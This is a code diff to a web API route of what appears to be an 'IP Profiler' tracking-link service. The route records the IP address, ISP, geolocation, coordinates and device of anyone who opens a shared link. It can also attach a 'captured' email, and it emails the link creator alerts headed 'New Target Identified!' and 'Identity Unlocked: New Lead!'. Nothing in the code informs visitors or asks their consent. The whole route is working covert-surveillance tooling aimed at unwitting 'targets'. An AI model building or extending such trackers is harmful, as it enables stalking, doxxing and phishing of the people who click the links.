@@ -30,59 +30,82 @@ export async function POST(request) {
             connectionType,
             linkId,
             visitorEmail,
-            visitorPhone,
-            platformUser
+            updateOnly
         } = body;
 
-        const log = await prisma.visitorLog.create({
-            data: {
-                systemId,
-                ip, isp, org, asn, mobile, proxy, hosting,
-                city, region, country, lat, lon, timezone,
-                browser, os, cpuArch, deviceType,
-                connectionType,
-                linkId: linkId || null,
-                platform,
-                visitorEmail: visitorEmail || null,
-                visitorPhone: visitorPhone || null,
-                platformUser: platformUser || null
-            },
-            include: {
-                link: true
-            }
-        });
+        let log;
 
-        // Trigger Email Notification if linkId exists and sender email is available
-        if (log.link?.senderEmail && resend) {
-            try {
-                await resend.emails.send({
-                    from: 'IP Profiler <notifications@resend.dev>', // Use a verified domain in production
-                    to: log.link.senderEmail,
-                    subject: '🚨 New Visitor on your Tracking Link!',
-                    html: `
-                        <h2>New Target Identified!</h2>
-                        <p>Someone just opened your shared link via <b>${platform}</b>.</p>
-                        <hr/>
-                        <ul>
-                            <li><b>IP:</b> ${ip}</li>
-                            <li><b>Location:</b> ${city}, ${region}, ${country}</li>
-                            <li><b>ISP:</b> ${isp}</li>
-                            <li><b>Platform:</b> ${platform}</li>
-                            ${visitorEmail ? `<li><b>Visitor Email:</b> ${visitorEmail}</li>` : ''}
-                            <li><b>Device:</b> ${os} (${browser})</li>
-                        </ul>
-                        <p><a href="${process.env.NEXT_PUBLIC_BASE_URL || ''}/report/${log.id}">View Full Forensic Report</a></p>
-                    `
+        if (updateOnly && systemId) {
+            // Update existing log with email
+            const existingLog = await prisma.visitorLog.findFirst({
+                where: { systemId, linkId },
+                orderBy: { createdAt: 'desc' }
+            });
+
+            if (existingLog) {
+                log = await prisma.visitorLog.update({
+                    where: { id: existingLog.id },
+                    data: { visitorEmail: visitorEmail || null },
+                    include: { link: true }
                 });
-                console.log('Email sent to:', log.link.senderEmail);
-            } catch (emailErr) {
-                console.error('Failed to send email:', emailErr);
+            } else {
+                return NextResponse.json({ success: false, error: 'Log not found' }, { status: 404 });
             }
-        } else if (log.link?.senderEmail) {
-            console.log('--- EMAIL NOTIFICATION (SIMULATED) ---');
-            console.log('TO:', log.link.senderEmail);
-            console.log('SUBJECT: New Visitor via', platform);
-            console.log('DATA:', { ip, city, platform });
+        } else {
+            // Create new log entry
+            log = await prisma.visitorLog.create({
+                data: {
+                    systemId,
+                    ip, isp, org, asn, mobile, proxy, hosting,
+                    city, region, country, lat, lon, timezone,
+                    browser, os, cpuArch, deviceType,
+                    connectionType,
+                    linkId: linkId || null,
+                    platform,
+                    visitorEmail: visitorEmail || null
+                },
+                include: {
+                    link: true
+                }
+            });
+        }
+
+        // Trigger Email Notification
+        // If it's a new log without email, we send a "Tracking Link Opened" alert
+        // If it's an update with email, we send a "Lead Captured / Identity Unlocked" alert
+        if (log.link?.senderEmail && (resend || process.env.NODE_ENV === 'development')) {
+            const subject = updateOnly ? '👤 Identity Unlocked: New Lead!' : '🚨 Tracking Link Opened';
+            const html = `
+                <h2>${updateOnly ? 'Lead Identity Captured!' : 'New Visitor Alert!'}</h2>
+                <p>Someone ${updateOnly ? 'just verified their identity' : 'just opened your tracking link'} via <b>${platform}</b>.</p>
+                <hr/>
+                <ul>
+                    <li><b>IP:</b> ${log.ip}</li>
+                    <li><b>Location:</b> ${log.city}, ${log.region}, ${log.country}</li>
+                    ${log.visitorEmail ? `<li style="color: #00ff9d; font-size: 1.2rem;"><b>Captured Email:</b> ${log.visitorEmail}</li>` : '<li style="color: #ff4d4d;"><b>Identity:</b> Locked (Awaiting lead capture)</li>'}
+                    <li><b>ISP:</b> ${log.isp}</li>
+                    <li><b>Platform:</b> ${platform}</li>
+                    <li><b>Device:</b> ${log.os} (${log.browser})</li>
+                </ul>
+                <p><a href="${process.env.NEXT_PUBLIC_BASE_URL || ''}/admin">View Dashboard for Full Details</a></p>
+            `;
+
+            if (resend) {
+                try {
+                    await resend.emails.send({
+                        from: 'IP Profiler <notifications@resend.dev>',
+                        to: log.link.senderEmail,
+                        subject: subject,
+                        html: html
+                    });
+                } catch (emailErr) {
+                    console.error('Failed to send email:', emailErr);
+                }
+            } else {
+                console.log('--- EMAIL SIMULATION ---');
+                console.log('TO:', log.link.senderEmail);
+                console.log('SUBJECT:', subject);
+            }
         }
 
         return NextResponse.json({ success: true, id: log.id });
